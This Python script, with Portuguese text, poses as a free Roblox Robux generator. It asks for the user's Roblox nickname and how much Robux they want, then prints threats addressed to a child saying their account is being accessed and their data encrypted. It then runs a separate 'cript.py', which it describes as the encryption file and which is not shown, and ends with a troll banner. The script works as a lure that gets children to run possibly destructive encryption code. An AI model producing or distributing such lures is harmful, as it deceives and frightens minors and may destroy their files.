from rich.console import Console
from rich.align import Align
from rich.prompt import Prompt
import os
import time

cor_fonte = "#20c20e" 
# cor_fundo = "#000000"

os.system("0a")
os.system("cls") # limpa uma mensagem chata da tela

# define um estilo para cor da fonte e cor de fundo de texto (mas não da tela toda)
# estilo = f"bold {cor_fonte} on {cor_fundo}" 
console = Console()

troll = r"""
         \|||/       
         (o o)       
,----ooO--(_)-------.
| Por favor         |
|  não alimente os  |
|      TROLLS!      |
'--------------Ooo--'
        |__|__|      
         || ||       
        ooO Ooo      
"""

scroll_banner = r"""
 _____                                                             _____ 
( ___ )                                                           ( ___ )
 |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   | 
 |   |  _____ ____  _____ _____      ____   ___  ____  _   ___  __ |   | 
 |   | |  ___|  _ \| ____| ____|    |  _ \ / _ \| __ )| | | \ \/ / |   | 
 |   | | |_  | |_) |  _| |  _|      | |_) | | | |  _ \| | | |\  /  |   | 
 |   | |  _| |  _ <| |___| |___     |  _ <| |_| | |_) | |_| |/  \  |   | 
 |   | |_|   |_| \_\_____|_____|    |_| \_\\___/|____/ \___//_/\_\ |   | 
 |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___| 
(_____)                                                           (_____)

Copyright 2026? 
By A-L-W-E-N-N-Y
"""

console.clear()
console.print(Align.center(scroll_banner), style=cor_fonte)

nick = Prompt.ask(f"[{cor_fonte}]Digite seu Nick do Roblox[/]")
qtd = Prompt.ask(f"[{cor_fonte}]Quantos robux você gostaria?[/]")

print("\n")

console.print(f"[{cor_fonte}]Olá, criança...")
time.sleep(2)
console.print(f"[{cor_fonte}]Eu sei o que você tentou fazer...")
time.sleep(3)
console.print(f"[{cor_fonte}]Estou tendo acesso a toda a sua conta")
time.sleep(2)
console.print(f"[{cor_fonte}]Nada nessa vida é de graça")
time.sleep(2)
console.print(f"[{cor_fonte}]Seus dados foram criptografados")
time.sleep(1)
console.print(f"[{cor_fonte}]Adeus...")
time.sleep(2)

os.system("python cript.py") # roda o arquivo de criptografia

console.print((troll), style=cor_fonte)
time.sleep(5)

input()